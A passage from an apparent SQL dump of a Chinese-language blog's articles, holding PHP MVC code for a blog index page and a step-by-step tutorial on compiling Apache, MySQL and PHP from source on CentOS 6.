&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;array();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pageNav&nbsp;=&nbsp;&#39;&#39;;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//向服务层取页面数据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret[&#39;articleList&#39;]&nbsp;=&nbsp;\\app\\Service\\IndexService::getIndexList($page);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret[&#39;pageNav&#39;]&nbsp;=&nbsp;array_pop($ret[&#39;articleList&#39;]);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret[&#39;pushs&#39;]&nbsp;=&nbsp;\\app\\Service\\adminService::getPushs();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret[&#39;pushArticleList&#39;]&nbsp;=&nbsp;\\app\\Service\\IndexService::getIndexPushList();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret[&#39;TagList&#39;]&nbsp;=&nbsp;\\app\\Service\\IndexService::getIndexTagList();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($ret&nbsp;&amp;&amp;&nbsp;!empty(getConfig(&#39;MEMCACHE&#39;))){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcache_set($mem,&#39;row_cache_indexController_&#39;.$page,$ret,0,$time);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//最新评论，不要缓存&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret[&#39;newComment&#39;]&nbsp;=&nbsp;\\app\\Service\\IndexService::getNewComment();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//给模版赋值&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;View::assign(&#39;newComment&#39;,&nbsp;$ret[&#39;newComment&#39;]);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;View::assign(&#39;TagList&#39;,&nbsp;$ret[&#39;TagList&#39;]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;View::assign(&#39;pushs&#39;,&nbsp;$ret[&#39;pushs&#39;]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;View::assign(&#39;articleList&#39;,&nbsp;$ret[&#39;articleList&#39;]);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;View::assign(&#39;pushArticleList&#39;,&nbsp;$ret[&#39;pushArticleList&#39;]);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;View::assign(&#39;pageNav&#39;,&nbsp;$ret[&#39;pageNav&#39;]);		\r\n	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;View::TofrontTpl(&#39;newindex&#39;);&nbsp;&nbsp;//引入模版文件\r\n}</code></pre><p><span style=\"color: rgb(0, 176, 80);\"><span style=\"font-size: 20px;\"><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">接下来是控制器服务层的代码</span></span></span></p><pre><code class=\"language-css\">&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;function&nbsp;getIndexList($page){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//数据条件\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$where&nbsp;=&nbsp;1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fields&nbsp;=&nbsp;&#39;*&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$order&nbsp;=&nbsp;&#39;`***`&nbsp;DESC&nbsp;,`***`&nbsp;DESC&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pagesize=10;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$model&nbsp;=&nbsp;new&nbsp;\\app\\Model\\IndexModel();&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//向模型层取数据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;$model-&gt;getArticleList($where,$page,$pagesize,$fields,$order);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$ret;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}</code></pre><p><span style=\"color: rgb(0, 176, 80);\"><span style=\"font-size: 20px;\"><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">然后就是最后的模型层代码<br/></span></span></span></p><pre><code class=\"language-css\">&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;getArticleList($where,$page,$pagesize,$fields,$order,$isGetNav=&#39;index&#39;){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$url&nbsp;=&nbsp;Request::getFullPath();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;=&nbsp;$this-&gt;SqlPageList($this-&gt;tableName,&nbsp;$where,&nbsp;$page,&nbsp;$pagesize,&nbsp;$fields,&nbsp;$order,$sumFields&nbsp;=&quot;&quot;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//分页数据\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(&nbsp;$isGetNav&nbsp;==&nbsp;&#39;index&#39;)&nbsp;$result[&#39;page_nav&#39;]&nbsp;=&nbsp;$this-&gt;getIndexPageNav($result[&#39;total&#39;],&nbsp;$page,&nbsp;$pagesize,$url);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$result;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;		\r\n&nbsp;}</code></pre><p><span style=\"color: rgb(0, 176, 80);\"><span style=\"font-size: 20px;\"><span style=\"font-size: 16px; color: rgb(0, 0, 0);\"></span></span></span>再往下就是核心代码层取数据了。就是数据库的一些操作，这里我就不说了。嘛，大体结构就是这样的，这样的架构用着也还算方便，用来搭建博客网站也是足够了。嗯，这就是初步介绍吧，接下的还没想好。-。-哈哈</p>',1446454353,'2016-10-14 08:46:02','0000-00-00 00:00:00',27,1,1,6,'http://leunico-upload.stor.sinaapp.com/image/20151218_1450403080_453748.jpg?imageView2/1/w/210/h/140'),(105,0,'linux','一只特立独行的猪2号','记一次CentOs6.X下LAMP环境的编译安装','CentOs6下编译安装LAMP环境。Linux环境开发是WEB开发中非常重要的一环，因为大都数网站服务器都是Linux环境。只不过我还是习惯在Windows环境下开发...(在虚拟机（VMware）里搭建的环境)','CentOs6下LAMP环境安装','用虚拟机vmware在CentOs6.X下编译安装LAMP环境','编译，LAMP','LAMP',292,'<p><span style=\"color: rgb(0, 0, 0);\"><img style=\"border-radius:4px;\" src=\"http://7xq09h.com1.z0.glb.clouddn.com/20151223_1450849619_625479.jpg\" title=\"20151223_1450849619_625479.jpg\" alt=\"netease-enterprise-mail.jpg\"/></span></p><p>说实话，Web开发我还是习惯在Windows环境下开发，但是作为一名合格的<span style=\"color: rgb(204, 0, 0);\">Coder</span><span style=\"line-height: 20px; background-color: rgb(255, 255, 255);\">会在Linux下开发是必须的，只是鉴于手残的程度，我还是喜欢在Windows开发然后Linux部署。毕竟大都数网站<span style=\"line-height: 20px; background-color: rgb(255, 255, 255);\">服务器</span>都是Linux环境，不过代码上线后再进行调试那就最好在Linux下开发了，</span>这样调试的一些脚本可以直接上线使用。其他方面Linux下装软件和装扩展还是比较方便，几句yum命令就完事了，而且像Git和Composer之类的开发工具都是基于Linux命令条的开发模式。最后，那啥，比起用Vim和Gedit管理代码我还是更喜欢Notepad和DW...T_T，还有，我是在虚拟机（VMware）里搭建的环境。</p><p>首先<a href=\"http://pan.baidu.com/s/1qWMAIBE\" target=\"_blank\" title=\"戳这里下载源码包\">戳这里下载源码包</a><br/></p><p><span style=\"color: rgb(57, 57, 57); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, helvetica, arial, verdana, tahoma, sans-serif; letter-spacing: 1px; line-height: 24px; font-size: 18px; background-color: rgb(255, 255, 255);\">&gt;&gt;在编译安装Lamp之前，先对环境做一些处理。</span></p><pre><code class=\"language-css\">&nbsp;&nbsp;&nbsp;#卸载一些rpm包\r\n&nbsp;&nbsp;&nbsp;rpm&nbsp;-e&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;rpm&nbsp;-e&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;rpm&nbsp;-e&nbsp;php\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;yum&nbsp;-y&nbsp;remove&nbsp;httpd&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;yum&nbsp;-y&nbsp;remove&nbsp;mysql-server&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;yum&nbsp;-y&nbsp;remove&nbsp;php&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;yum&nbsp;-y&nbsp;remove&nbsp;php-mysql\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;#禁用selinux\r\n&nbsp;&nbsp;&nbsp;sed&nbsp;-i&nbsp;&#39;s/SELINUX=enforcing/SELINUX=disabled/g&#39;&nbsp;/etc/selinux/config&nbsp;&nbsp;#重启生效。&nbsp;\r\n&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;##安装编译工具gcc&nbsp;gcc-c++make&nbsp;automake&nbsp;autoconf&nbsp;kernel-devel.</code></pre><p><span style=\"color: rgb(57, 57, 57); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, helvetica, arial, verdana, tahoma, sans-serif; letter-spacing: 1px; line-height: 24px; font-size: 18px; background-color: rgb(255, 255, 255);\"><br/></span></p><p><span style=\"color: rgb(57, 57, 57); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, helvetica, arial, verdana, tahoma, sans-serif; letter-spacing: 1px; line-height: 24px; font-size: 16px; background-color: rgb(228, 230, 233);\"></span><span style=\"color: rgb(57, 57, 57); font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, helvetica, arial, verdana, tahoma, sans-serif; letter-spacing: 1px; line-height: 24px; font-size: 18px; background-color: rgb(255, 255, 255);\">&gt;&gt;开始安装</span></p><p>1.创建目录<br/></p><pre><code class=\"language-css\">#&nbsp;tar_gz放置源码包(把下载到的源码包放在这),sh放置shell脚本,backup放置编译安装日志\r\ncd&nbsp;/mkdir&nbsp;-p&nbsp;/lamp/sh&nbsp;&nbsp;/lamp/tar_gz&nbsp;&nbsp;/lamp/backup</code></pre><p>2.源码包解压缩<br/></p><pre><code class=\"language-css\">vim&nbsp;/lamp/sh/auto-zxvf.sh\r\n#编辑auto_zxvf.sh后保存\r\n\r\n#!/bin/bash\r\ncd&nbsp;/lamp/tar_gz\r\nls&nbsp;*.tar.gz&nbsp;&gt;&nbsp;ls.list\r\nfor&nbsp;TAR&nbsp;in&nbsp;`cat&nbsp;ls.list`\r\ndo&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;-zxvf&nbsp;$TAR\r\ndone\r\n\r\n#执行命令\r\nbash&nbsp;auto-zxvf.sh</code></pre><p><span style=\"color: rgb(0, 176, 80);\">3.<span style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\">安装Apache</span></span></p><pre><code class=\"language-css\">先安装Apache依赖库\r\n\r\n#安装apr\r\ncd&nbsp;/lamp/tar_gz/apr-1.4.5\r\n./configure&nbsp;--prefix=/usr/local/apr/\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/apr.install.log\r\n\r\n#安装apr-util\r\ncd&nbsp;/lamp/tar_gz/apr-util-1.3.12\r\n./configure&nbsp;--prefix=/usr/local/apr-util/&nbsp;--with-apr=/usr/local/apr/\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/apr-util.install.log\r\n\r\n#安装pcre\r\ncd&nbsp;/lamp/tar_gz/pcre-8.32\r\n./configure&nbsp;--prefix=/usr/local/pcre/\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/pcre.install.log\r\n\r\n#安装zlib\r\ncd&nbsp;/lamp/tar_gz/zlib-1.2.8\r\n./configure\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&gt;&nbsp;/lamp/backup/zlib.install.log\r\n\r\n然后安装apache，要编译哪些模块可以自己选择\r\n\r\ncd&nbsp;/lamp/tar_gz/httpd-2.4.10\r\n./configure&nbsp;&nbsp;--prefix=/usr/local/apache2&nbsp;--with-apr=/usr/local/apr&nbsp;--with-apr-util=/usr/local/apr-util/&nbsp;--with-pcre=/usr/local/pcre&nbsp;--enable-so&nbsp;--enable-deflate=shared&nbsp;--enable-expires=shared&nbsp;--enable-ssl=shared&nbsp;--enable-headers=shared&nbsp;--enable-rewrite=shared&nbsp;--with-mpm=prefork\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&gt;&nbsp;/lamp/backup/apache.install.log</code></pre><p><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\"><span style=\"font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);\"></span><span style=\"color: rgb(0, 176, 80);\">4.</span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\">配置Apache</span></span><br/></p><pre><code class=\"language-css\">#开机启动\r\necho&nbsp;&quot;/usr/local/apache2/bin/apachectl&nbsp;start&quot;&nbsp;&gt;&gt;&nbsp;/etc/rc.d/rc.local\r\n\r\n#编辑配置文件\r\n#如果httpd.conf在安装的时候没有路径，那么就使用默认的配置文件。\r\nvim&nbsp;/usr/local/apache2/conf/httpd.conf\r\n\r\n#去掉注释并改为&nbsp;&nbsp;\r\nServerName&nbsp;localhost:80\r\n#在适当位置修改\r\nAddtype&nbsp;application/x-httpd-php&nbsp;.php&nbsp;.phtml\r\n#以下增加一个index.php，\r\n&lt;IfModule&nbsp;dir_module&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;DirectoryIndex&nbsp;index.html&nbsp;index.php\r\n&lt;/IfModule&gt;\r\n#根路径，根据情况决定是否修改\r\nDocumentRoot&nbsp;&quot;/usr/local/apache2/htdocs&quot;&nbsp;\r\n\r\n#启动\r\n/usr/local/apache2/bin/apachectl&nbsp;start</code></pre><p><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\"><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\"></span></span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px;\">5.</span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\">安装Mysql</span></p><pre><code class=\"language-css\">#先安装Mysql安装前的所需包\r\n\r\n#安装cmake编译工具\r\ncd&nbsp;/lamp/tar_gz/cmake-2.8.5\r\n./configure&nbsp;--prefix=/usr/local/cmake/\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/cmake.install.log\r\n\r\n#执行此命令，否则有错误提示\r\nexport&nbsp;PATH=/usr/local/cmake/bin:$PATH\r\n\r\n#安装ncurses\r\ncd&nbsp;/lamp/tar_gz/ncurses-5.7\r\n./configure&nbsp;--with-shared&nbsp;--without-debug&nbsp;--without-ada&nbsp;--enable-overwrite\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/ncurses.install.log\r\n\r\n#安装bison\r\ncd&nbsp;/lamp/tar_gz/bison-3.0\r\n./configure\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/bison.install.log\r\n\r\n\r\n#安装mysql\r\ngroupadd&nbsp;mysql\r\nuseradd&nbsp;-g&nbsp;mysql&nbsp;mysql\r\ncd&nbsp;/lamp/tar_gz/mysql-5.6.22\r\n\r\ncmake&nbsp;-DCMAKE_INSTALL_PREFIX=/usr/local/mysql&nbsp;\\\r\n-DMYSQL_UNIX_ADDR=/tmp/mysql.sock&nbsp;\\\r\n-DDEFAULT_CHARSET=utf8&nbsp;\\\r\n-DDEFAULT_COLLATION=utf8_general_ci&nbsp;\\\r\n-DWITH_EXTRA_CHARSETS:STRING=utf8,gbk&nbsp;\\\r\n-DWITH_MYISAM_STORAGE_ENGINE=1&nbsp;\\\r\n-DWITH_INNOBASE_STORAGE_ENGINE=1&nbsp;\\\r\n-DWITH_READLINE=1&nbsp;\\\r\n-DENABLED_LOCAL_INFILE=1&nbsp;\\\r\n-DMYSQL_DATADIR=/usr/local/mysql&nbsp;\\\r\n-DMYSQL_TCP_PORT=3306\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&gt;&nbsp;/lamp/backup/mysql.install.log</code></pre><p><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\"></span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px;\">6.</span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\">配置Mysql</span></p><pre><code class=\"language-css\">#改变mysql目录所有者，所属组，以及所属组的权限\r\nchown&nbsp;-R&nbsp;mysql:mysql&nbsp;/usr/local/mysql&nbsp;\r\nchmod&nbsp;+w&nbsp;/usr/local/mysql\r\n\r\n#初始化一些表。\r\ncd&nbsp;/usr/local/mysql\r\nscripts/mysql_install_db&nbsp;--user=mysql&nbsp;--basedir=/usr/local/mysql&nbsp;--datadir=/usr/local/mysql/data\r\n\r\n#拷贝覆盖配置文件\r\ncp&nbsp;-f&nbsp;my.cnf&nbsp;/etc/my.cnf\r\n#编辑配置，查找并修改\r\nvim&nbsp;/etc/my.cnf\r\nbasedir&nbsp;=&nbsp;/usr/local/mysql\r\ndatadir&nbsp;=&nbsp;/usr/local/mysql/data\r\nsocket&nbsp;=&nbsp;/tmp/mysql.sock\r\nport&nbsp;=&nbsp;3306\r\nserver_id&nbsp;=&nbsp;1\r\n\r\n#复制启动文件到启动目录，并且编辑启动文件\r\ncp&nbsp;support-files/mysql.server&nbsp;/etc/init.d/mysqld\r\nvim&nbsp;/etc/init.d/mysqld\r\n\r\n#查找并修改\r\nbasedir=/usr/local/mysql&nbsp;\r\ndatadir=/usr/local/mysql/data\r\n\r\n#把启动mysql控制台的命令，生成一个软连接，放到/usr/bin目录下，这样只要输入mysql就可以启动mysql控制台了\r\nln&nbsp;-s&nbsp;/usr/local/mysql/bin/mysql&nbsp;/usr/bin\r\n\r\n#开启mysql服务\r\nservice&nbsp;mysqld&nbsp;start&nbsp;或者&nbsp;/etc/init.d/mysqld&nbsp;start</code></pre><p><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\"></span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px;\">7.</span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\">安装PHP</span></p><pre><code class=\"language-css\">#安装PHP依赖库\r\n\r\n#安装libxml2\r\ncd&nbsp;/lamp/tar_gz/libxml2-2.6.30\r\n./configure&nbsp;--prefix=/usr/local/libxml2/&nbsp;&nbsp;--without-zlib\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&gt;&nbsp;/lamp/backup/libxml2.install.log\r\n\r\n#安装libmcrypt\r\ncd&nbsp;/lamp/tar_gz/libmcrypt-2.5.8\r\n./configure&nbsp;--prefix=/usr/local/libmcrypt/\r\nmake&nbsp;&amp;&amp;&nbsp;&nbsp;make&nbsp;install&nbsp;&gt;&nbsp;/lamp/backup/libmcrypt.install.log\r\n\r\n#安装libpng\r\ncd&nbsp;/lamp/tar_gz//libpng-1.6.16\r\n./configure&nbsp;--prefix=/usr/local/libpng/\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/libpng.install.log\r\n\r\n#安装jpeg\r\ncd&nbsp;/lamp/tar_gz/jpeg-9a\r\n./configure&nbsp;--prefix=/usr/local/jpeg&nbsp;--enable-shared&nbsp;--enable-static\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/jpeg.install.log\r\n\r\n#安装freetype\r\ncd&nbsp;/lamp/tar_gz/freetype-2.5.5\r\n./configure&nbsp;--prefix=/usr/local/freetype/\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&gt;&nbsp;/lamp/backup/freetype.install.log\r\n\r\n#安装autoconf\r\ncd&nbsp;/lamp/tar_gz/autoconf-2.69\r\n./configure\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&gt;&nbsp;/lamp/backup/autoconf.install.log\r\n\r\n#安装gd\r\ncd&nbsp;/lamp/tar_gz/gd-2.0.35\r\n./configure&nbsp;--prefix=/usr/local/gd2/&nbsp;--with-jpeg=/usr/local/jpeg/&nbsp;--with-freetype=/usr/local/freetype/\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/gd2.install.log\r\n\r\n#安装php\r\ncd&nbsp;/lamp/tar_gz/php-5.5.21\r\n./configure&nbsp;--prefix=/usr/local/php/&nbsp;--with-libxml-dir=/usr/local/libxml2/&nbsp;--with-mysql=/usr/local/mysql/&nbsp;--with-apxs2=/usr/local/apache2/bin/apxs&nbsp;--with-config-file-path=/etc\r\nmake&nbsp;&amp;&amp;&nbsp;make&nbsp;install&nbsp;&nbsp;&gt;&nbsp;/lamp/backup/php.install.log</code></pre><p><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\"></span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px;\">8.</span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\">配置PHP</span></p><pre><code class=\"language-css\">cp&nbsp;php.ini-development&nbsp;/usr/local/php/etc/php.ini</code></pre><p><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 13.92px; line-height: 20.88px; background-color: rgb(255, 255, 255);\"></span><span style=\"color: rgb(0, 176, 80); font-family: Verdana, Arial, Helvetica, sans-serif; 